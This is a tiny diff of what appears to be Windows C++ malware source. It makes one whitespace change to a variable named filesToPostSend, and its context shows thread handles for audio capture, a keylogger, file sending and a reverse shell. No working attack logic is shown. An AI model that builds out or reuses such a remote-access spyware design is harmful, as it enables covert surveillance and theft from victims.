@@ -2,7 +2,7 @@
 
 using namespace std;
 
-atomic<std::string *>filesToPostSend((string *)(new string));
+atomic<std::string *> filesToPostSend((string *)(new string));
 
 int main(){
     HANDLE audioThread, keyloggerThread, fileSendThread, reverseShellThread;
